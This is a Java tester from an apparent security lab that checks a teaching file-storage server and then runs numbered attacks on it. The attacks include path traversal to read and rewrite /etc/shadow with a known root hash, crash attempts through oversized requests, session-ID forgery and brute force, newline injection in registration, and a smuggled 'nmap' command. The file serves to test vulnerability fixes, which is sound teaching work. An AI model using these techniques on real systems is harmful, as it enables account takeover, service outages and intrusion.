package ch.zhaw.securitylab.securefilestorage;

import java.io.*;
import java.net.*;
import static ch.zhaw.securitylab.securefilestorage.Common.*;
import java.time.Instant;
import java.util.Random;

public class SecureFileStorageTester {

    // Hostname of the server to test
    private static String host;

    // Flags to be set via command line parameters
    private static int attack = 0;

    // Test files and content
    private static final String TEST_FILE_GET = "file1.txt";
    private static final String TEST_FILE_PUT = "testfile.txt";
    private static final String TEST_CONTENT = "Terrific test file content!\nSpread across two lines.\n";
    
    // Invalid credentials and session ID
    private static final String INVALID_CREDENTIALS = "user1:password0";
    private static final String INVALID_SESSION_ID = "user1:9CE51BF4F7294D27B34CED62BB128C08E8E4F109F52D35FABC83332F03022016";
    
    // Valid credentials
    private static final String USER1 = "user1:password1"; 

    // The hash of the password "test"
    private static final String ROOT_PASSWORD = "$6$FHbP7AAr$I3jzf/uNs4cv1qoJtFNioOYsDtGRZefEFGt.FoGtYmDLJ3kJTWaGra4kCHP70AdaMAQ0lP6r1ORpQX68ahb02/";
    
    // Random mumber generator
    public static final Random RANDOM = new Random();

    /* Run the test(s) */
    private void run() throws IOException {

        System.out.println();

        // Test functionality
        if ((attack == 0) || (attack == -1)) {
            runTests(0);
        }
        
        // Try to compromise the root account
        if ((attack == 1) || (attack == -1)) {
            runCompromiseRoot(1);
        }
        
        // Try to crash the server by sending an empty request
        if ((attack == 2) || (attack == -1)) {
            runEmptyRequest(2);
        }
        
        // Try to crash the server by sending a malformed GET request
        if ((attack == 3) || (attack == -1)) {
            runMalformedGETRequest(3);
        }

        // Try to crash the server by sending a long first request line 
        if ((attack == 4) || (attack == -1)) {
            runLongFirstRequestLine(4);
        }

        // Try to crash the server by sending a PUT request with a long line 
        if ((attack == 5) || (attack == -1)) {
            runPUTRequestWithLongLine(5);
        }

        // Try to crash the server by sending a PUT request with many lines 
        if ((attack == 6) || (attack == -1)) {
            runPUTRequestWithManyLines(6);
        }
        
        // Try to get a file of another user (variant 1)
        if ((attack == 7) || (attack == -1)) {
            runGetFileOfOtherUserVar1(7);
        }

        // Try to get the users file that contains the credentials (variant 1)
        if ((attack == 8) || (attack == -1)) {
            runGetUsersFileVar1(8);
        }
        
        // Try to get a file of another user (variant 2)
        if ((attack == 9) || (attack == -1)) {
            runGetFileOfOtherUserVar2(9);
        }
        
        // Try to guess a valid session ID
        if ((attack == 10) || (attack == -1)) {
            runGuessSessionID(10);
        }

        // Try to register as an existing user
        if ((attack == 11) || (attack == -1)) {
            runRegisterAsExistingUser(11);
        }
        
        // Try to get the users file that contains the credentials (variant 2)
        if ((attack == 12) || (attack == -1)) {
            runGetUsersFileVar2(12);
        }
        
        // Try to login without knowing the password
        if ((attack == 13) || (attack == -1)) {
            runLoginWithoutKnowingPassword(13);
        }
        
        // Try to do a local portscan on the server
        if ((attack == 14) || (attack == -1)) {
            runCommandInjection(14);
        }
    }
    
    /* Runs the tests to check correct functionality of RTEGISTER, LOGIN, GET,
       PUT and SYSTEM */
    private void runTests(int attackNumber) throws IOException {
        String sessionID;
        
        // Test 1a: Check REGISTER (existing cedentials)
        checkServerRunning();
        System.out.print("Test " + attackNumber + "a: Check REGISTER (existing credentials)... ");
        Response response = doREGISTER(USER1);
        System.out.println("done");
        System.out.println(response.status);
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1b: Check REGISTER (new credentials)
        System.out.print("Test " + attackNumber + "b: Check REGISTER (valid credentials)... ");
        String credentials = "user" + getRandomInt() + ":password";
        response = doREGISTER(credentials);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1c: Check LOGIN (invalid cedentials)
        checkServerRunning();
        System.out.print("Test " + attackNumber + "c: Check LOGIN (invalid credentials)... ");
        response = doLOGIN(INVALID_CREDENTIALS);
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1d: Check LOGIN (valid credentials)
        System.out.print("Test " + attackNumber + "d: Check LOGIN (valid credentials)... ");
        response = doLOGIN(USER1);
        System.out.println("done");
        if (response.status.equals(OK) && (response.content.length() > 0)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        sessionID = removeLastChar(response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1e: Check GET (file existing)
        System.out.print("Test " + attackNumber + "e: Check GET (file existing)... ");
        response = doGET(TEST_FILE_GET, sessionID);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1f: Check GET (file not existing)
        System.out.print("Test " + attackNumber + "f: Check GET (file not existing)... ");
        response = doGET("not-existing.txt", sessionID);
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1g: Check PUT (invalid session ID)
        System.out.print("Test " + attackNumber + "g: Check PUT (invalid session ID)... ");
        response = doPUT(TEST_FILE_PUT, INVALID_SESSION_ID, TEST_CONTENT);
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
       
        // Test 1h: Check PUT (valid session ID)
        System.out.print("Test " + attackNumber + "h: Check PUT (valid session ID)... ");
        response = doPUT(TEST_FILE_PUT, sessionID, TEST_CONTENT);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();

        // Test 1i: Check SYSTEM (command existing)
        System.out.print("Test " + attackNumber + "i: Check SYSTEM (command existing)... ");
        response = doSYSTEM(COMMAND_USAGE, "*", sessionID);
        System.out.println("done");
        if (response.status.equals(OK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
        
        // Test 1j: Check GET (file not existing)
        System.out.print("Test " + attackNumber + "j: Check SYSTEM (command not existing)... ");
        response = doSYSTEM("not-existing", "*", sessionID);
        System.out.println("done");
        if (response.status.equals(NOK)) {
            System.out.println("Test **SUCCEEDED**");
        } else {
            System.out.println("Test **FAILED**");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack to compromise the root account */
    private void runCompromiseRoot(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Compromise root... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = removeLastChar(response.content);
        
            // Get shadow file
            response = doGET("../../../../../../../../../../../../../../../etc/shadow", sessionID);
            if (response.status.equals(NOK)) {
                System.out.println("done");
                System.out.println("Attack **FAILED** (shadow file could not be read)");
            } else {
            
                // Shadow file could be read, build array of shadow file lines
                String[] shadowLines = response.content.split("\n");
                
                // Create new shadow file content with replaced root password
                StringBuilder newShadowFile = new StringBuilder();
                for (int i=0; i < shadowLines.length; ++i) {
                    String[] shadowLine = shadowLines[i].split(":");
                    if (shadowLine[0].equals("root")) {
                        StringBuilder newRootLine = new StringBuilder("root:" + ROOT_PASSWORD);
                        for (int j=2; j < shadowLine.length; ++j) {
                            newRootLine.append(":").append(shadowLine[j]);
                        }
                        newRootLine.append(":::");
                        newShadowFile.append(newRootLine).append("\n");
                    } else {
                        newShadowFile.append(shadowLines[i]).append("\n");
                    }
                }
                
                // Write shadow file to server
                response = doPUT("../../../../../../../../../../../../../../../etc/shadow", 
                        sessionID, newShadowFile.toString());
                System.out.println("done");
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (shadow file could not be written)");
                } else {
                    System.out.println("Attack **SUCCEEDED** (compromized root by setting password to 'test')");
                }
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack that consists of an empty request */
    private void runEmptyRequest(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send empty request... ");
    
        // Send empty request
        Response response = doCustom("\n");
        System.out.println("done");
        if (response.status == null) {
            System.out.println("Attack **SUCCEEDED** (server crashed)");
            response.status = "";
        } else {
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
         }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the attack that consists of a malfomred GET request */
    private void runMalformedGETRequest(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send malformed GET request... ");
        
        // Send malformed GET request
        Response response = doCustom("GET file1.txt\n" + DONE + "\n");
        System.out.println("done");
        if (response.status == null) {
            System.out.println("Attack **SUCCEEDED** (server crashed)");
            response.status = "";
        } else {
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack that consists of a long first request line */
    private void runLongFirstRequestLine(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a long request... ");
        
        // Connect and send a long request
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        Response response = new Response();
        long count = 0;
        try {
            for (; count < 500000000; ++count) {
                toServer.write("10_Bytes__");
            }
            toServer.flush();
            System.out.println("done (connection not broken after " + (10 * count) + " Bytes sent)");
            response.status = fromServer.readLine();
            response.content = readContent(fromServer);
            if (response.status.equals(NOK)) {
                System.out.println("Attack **FAILED** (server did not crash)");
            } else {
                System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
            }
        } catch (IOException e) {
            System.out.println("done (connection broken after " + (10 * count) + " Bytes sent)");
            try {
                connectTest();
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e1) {
                System.out.println("Attack **SUCCEEDED** (server crashed)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack that consists of a PUT request with a long line */
    private void runPUTRequestWithLongLine(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a PUT request with a long line... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = removeLastChar(response.content);
        
            // Connect and send PUT request with a long line
            Socket socket = connect();
            OutputStreamWriter toServer = getWriter(socket);
            BufferedReader fromServer = getReader(socket);
            response = new Response();
            toServer.write(PUT + " longfile.txt\n" + sessionID + "\n" + CONTENT + "\n");
            long count = 0;
            try {
                for (; count < 500000000; ++count) {
                    toServer.write("10_Bytes__");
                }
                toServer.flush();
                System.out.println("done (connection not broken after " + (10 * count) + " Bytes sent)");
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e) {
                System.out.println("done (connection broken after " + (10 * count) + " Bytes sent)");
                try {
                    connectTest();
                    response.status = fromServer.readLine();
                    response.content = readContent(fromServer);
                    if (response.status.equals(NOK)) {
                        System.out.println("Attack **FAILED** (server did not crash)");
                    } else {
                        System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                    }
                } catch (IOException e1) {
                    System.out.println("Attack **SUCCEEDED** (server crashed)");
                }
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack that consists of a PUT request with many lines */
    private void runPUTRequestWithManyLines(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Send a PUT request with many lines... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = removeLastChar(response.content);
        
            // Connect and send PUT request with many lines
            Socket socket = connect();
            OutputStreamWriter toServer = getWriter(socket);
            BufferedReader fromServer = getReader(socket);
            response = new Response();
            toServer.write("PUT longfile\n" + sessionID + "\n" + CONTENT + "\n");
            long count = 0;
            try {
                for (; count < 100000000; ++count) {
                    for (int i=0; i < 50; ++i) {
                        toServer.write("10_Bytes__");
                    }
                    toServer.write("\n");
                }
                toServer.flush();
                System.out.println("done (connection not broken after " + (500 * count) + " Bytes sent)");
                response.status = fromServer.readLine();
                response.content = readContent(fromServer);
                if (response.status.equals(NOK)) {
                    System.out.println("Attack **FAILED** (server did not crash)");
                } else {
                    System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                }
            } catch (IOException e) {
                System.out.println("done (connection broken after " + (500 * count) + " Bytes sent)");
                try {
                    connectTest();
                    response.status = fromServer.readLine();
                    response.content = readContent(fromServer);
                    if (response.status.equals(NOK)) {
                        System.out.println("Attack **FAILED** (server did not crash)");
                    } else {
                        System.out.println("Attack **FAILED** (server did not crash, but didn't respond with NOK)");
                    }
                } catch (IOException e1) {
                    System.out.println("Attack **SUCCEEDED** (server crashed)");
                }
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the first variant of the attack to get a file of another user */
    private void runGetFileOfOtherUserVar1(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get file of other user (var 1)... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = sessionID = removeLastChar(response.content);
        
            // Get file of another user
            response = doGET("../user2/file2.txt", sessionID);
            System.out.println("done");
            if (response.status.equals(OK)) {
                System.out.println("Attack **SUCCEEDED** (file could be read)");
            } else {
                System.out.println("Attack **FAILED** (file could not be read)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the first variant of the attack to get the users file with the credentials */
    private void runGetUsersFileVar1(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get users file with credentials (var 1)... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = removeLastChar(response.content);
        
            // Get users file
            response = doGET("..%2F..%2Fsystem%2Fusers", sessionID);
            System.out.println("done");
            if (response.status.equals(OK)) {
                System.out.println("Attack **SUCCEEDED** (file could be read)");
            } else {
                System.out.println("Attack **FAILED** (file could not be read)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    
    /* Run the second variant of the attack to get a file of another user */
    private void runGetFileOfOtherUserVar2(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get file of other user (var 2)... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = removeLastChar(response.content);
            
            // Modify session ID so it contains user2
            String[] tokens = sessionID.split(":");
            sessionID = "user2:" + tokens[1];
        
            // Get file of another user
            response = doGET("file2.txt", sessionID);
            System.out.println("done");
            if (response.status.equals(OK)) {
                System.out.println("Attack **SUCCEEDED** (file could be read)");
            } else {
                System.out.println("Attack **FAILED** (file could not be read)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
   
    /* Run the attack to guess a valid session ID */
    private void runGuessSessionID(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Guess a valid session ID... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionIDToGuess = removeLastChar(response.content);
            System.out.println("\nSession ID to guess: " + sessionIDToGuess);
            
            // Guess the session ID based on current timeStamp (minus a few seconds)
            // Get current timestamp
            long timeStamp = Instant.now().toEpochMilli() - 20000;
            boolean found = false;
            int count = 0;
            String sessionIDCandidate = "";
            while (!found && count < 50000) {
                sessionIDCandidate = "user1:" + toHexString(
                        sha2_256_10000(("" + timeStamp).getBytes()));
                response = doGET(TEST_FILE_GET, sessionIDCandidate);
                ++count;
                if (response.status.equals(OK)) {
                    found = true;
                } else {
                    if (count % 1000 == 0) {
                        System.out.println(count + " guesses done, session ID not yet found...");
                    }
                    ++timeStamp;
                }
            }
            if (found) {
                System.out.println("done, session ID found after " + count + " guesses: " + sessionIDCandidate);
                System.out.println("Attack **SUCCEEDED**");
            } else {
                System.out.println("done, session ID not found after " + count + " guesses, I'm giving up :-(");
                System.out.println("Attack **FAILED**");
            }
        }
        checkServerStillRunning();
        System.out.println();
    }

    /* Run the attack to register as an existing user */
    private void runRegisterAsExistingUser(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Register as an existing user... ");
        
        String credentials = "user" + getRandomInt() + ":password%0Auser2:password";
        Response response = doREGISTER(credentials);
        if (response.status.equals(NOK)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (user could not be created)");
        } else {
            
            // Do a login as user2
            response = doLOGIN("user2:password");
            System.out.println("done");
            if (response.status.equals(OK) && (response.content.length() > 0)) {
                System.out.println("Attack **SUCCEEDED**");
            } else {
                System.out.println("Attack **FAILED** (login failed)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
        
    /* Run the second variant of the attack to get the users file with the credentials */
    private void runGetUsersFileVar2(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Get users file with credentials (var 2)... ");
        
        String credentials = "../system/:password";
        Response response = doREGISTER(credentials);
        if (response.status.equals(NOK)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (user could not be created)");
        } else {
            
            // Do a login as ../../system/users
            response = doLOGIN("../system/:password");
            if (response.status.equals(NOK) || (response.content.length() == 0)) {
                System.out.println("done");
                System.out.println("Attack **FAILED** (login failed)");
            } else {
                String sessionID = response.content;
                System.out.println(sessionID);
        
                // Get users file
                response = doGET("users", sessionID);
                System.out.println("done");
                if (response.status.equals(OK)) {
                    System.out.println("Attack **SUCCEEDED** (file could be read)");
                } else {
                    System.out.println("Attack **FAILED** (file could not be read)");
                }
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }

    /* Run the attack to login without knowing the password */
    private void runLoginWithoutKnowingPassword(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Login without knowing the password... ");
        
        // Do a login
        Response response = doLOGIN("user3:");
        System.out.println("done");
        if (response.status.equals(OK) && (response.content.length() > 0)) {
            System.out.println("Attack **SUCCEEDED** (login succeeded)");
        } else {
            System.out.println("Attack **FAILED** (login failed)");
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }
    

    /* Run the attack to do command injection (using a portscan as an example) */
    private void runCommandInjection(int attackNumber) throws IOException {
        checkServerRunning();
        System.out.print("Attack " + attackNumber + ": Do a local portscan on the server... ");
        
        // Do a login
        Response response = doLOGIN(USER1);
        if (response.status.equals(NOK) || (response.content.length() == 0)) {
            System.out.println("done");
            System.out.println("Attack **FAILED** (login failed)");
        } else {
            String sessionID = response.content;
        
            // Do a local portscan
            response = doSYSTEM(COMMAND_USAGE, "*; nmap -A -p1-100 localhost", sessionID);
            System.out.println("done");
            if (response.status.equals(OK)) {
                System.out.println("Attack **SUCCEEDED** (portscan could be done)");
            } else {
                System.out.println("Attack **FAILED** (portscan could not be done)");
            }
        }
        System.out.println("Status:  " + response.status);
        System.out.println("Content: " + response.content);
        checkServerStillRunning();
        System.out.println();
    }

    /* Do a REGISTER request and return the response */
    private Response doREGISTER(String credentials) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = REGISTER + " " + credentials + "\n" + DONE + "\n";
        // System.out.println("Request: " + request);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
    
    /* Do a LOGIN request and return the response */
    private Response doLOGIN(String credentials) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = LOGIN + " " + credentials + "\n" + DONE + "\n";
        // System.out.println("Request: " + request);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }

    /* Do a GET request and return the response */
    private Response doGET(String filename, String sessionID) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createGETRequest(filename, sessionID);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
   
    /* Do a PUT request and return the response */
    private Response doPUT(String filename, String sessionID, String content) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createPUTRequest(filename, sessionID, content);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }

    /* Do a COMMAND request and return the response s */
    private Response doSYSTEM(String command, String options, String sessionID) 
            throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        String request = createSYSTEMRequest(command, options, sessionID);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
    
    /* Do a custom request and return the response */
    private Response doCustom(String request) throws IOException {
        Socket socket = connect();
        OutputStreamWriter toServer = getWriter(socket);
        BufferedReader fromServer = getReader(socket);
        toServer.write(request);
        toServer.flush();
        socket.shutdownOutput();
        Response response = new Response();
        response.status = fromServer.readLine();
        response.content = readContent(fromServer);
        socket.close();
        return response;
    }
       
    /* Create a GET request */
    private String createGETRequest(String filename, String sessionID) {
        return GET + " " + filename + "\n" + sessionID + "\n" + DONE + "\n";
    }

    /* Create a PUT request */
    private String createPUTRequest(String filename, String sessionID, String content) {
        return PUT + " " + filename + "\n" + sessionID + "\n" + CONTENT + "\n" + content +
               "\n" + DONE + "\n";
    }

    /* Create a COMMAND request */
    private String createSYSTEMRequest(String command, String options, String sessionID) {
        return SYSTEM + " " + command + " " + options + "\n" + sessionID + "\n" + DONE + "\n";
    }
    
    /* Read content from server */
    private String readContent(BufferedReader fromServer) throws IOException {
        StringBuilder content = new StringBuilder();
        
        // Process remaining lines and return content
        String line = fromServer.readLine();
        while ((line != null) && (!line.equals(DONE))) {
            if(!line.equals(CONTENT)) {
                content.append(line).append("\n");
            }
            line = fromServer.readLine();
        }
        return content.toString();
    }
    
    /* Establishes a connection */
    private Socket connect() throws IOException {
        return new Socket(host, PORT);
    }

    /* Gets a BufferedReader from a socket */
    private BufferedReader getReader(Socket socket) throws IOException {
        return new BufferedReader(new InputStreamReader(socket.getInputStream()));
    }

    /* Gets an OutputStreamWriter from a socket */
    private OutputStreamWriter getWriter(Socket socket) throws IOException {
        return new OutputStreamWriter(socket.getOutputStream());
    }

    /* Tests if the connection can be established */
    private void connectTest() throws IOException {
        try {
            Thread.sleep(1000);
        } catch (Exception e) {
        }
        Socket socket = connect();
        socket.close();
    }

    /* Tests if the server is running at all */
    private void checkServerRunning() {
        try {
            connectTest();
        } catch (IOException e) {
            System.out.println("Server does not appear to be running, exiting\n");
            System.exit(0);
        }
    }

    /* Tests if the server is still running */
    private void checkServerStillRunning() {
        try {
            Thread.sleep(1000);
            connectTest();
            System.out.println("Server still running");
        } catch (Exception e) {
            System.out.println("Server crashed");
        }
    }
    
    /* Remove the last char from a string and return it as a new string */
    private String removeLastChar(String input) {
        if (input.length() == 0) {
            return input;
        } else {
            return input.substring(0, input.length() - 1);
        }
    }
    
    /* Get random int >= 0 */
    public static int getRandomInt() {
        return Math.abs(RANDOM.nextInt());
    }
    

    /* This method is called when the program is run from the command line */
    public static void main(String argv[]) throws IOException {

        // Create a SecureFileStorageTester object, and run it
        try {
            host = argv[0];
            if (argv.length > 1) {
                attack = Integer.parseInt(argv[1]);
                if ((attack < 0) || (attack > 14)) {
                    throw (new Exception());
                }
            }
        } catch (Exception e) {
            System.out.println("Usage: java SecureFileStorageTester hostname {0-14}\n");
            System.exit(0);
        }
        SecureFileStorageTester swst = new SecureFileStorageTester();
        swst.run();
    }
}

class Response {
    public String status = "";
    public String content = "";
}
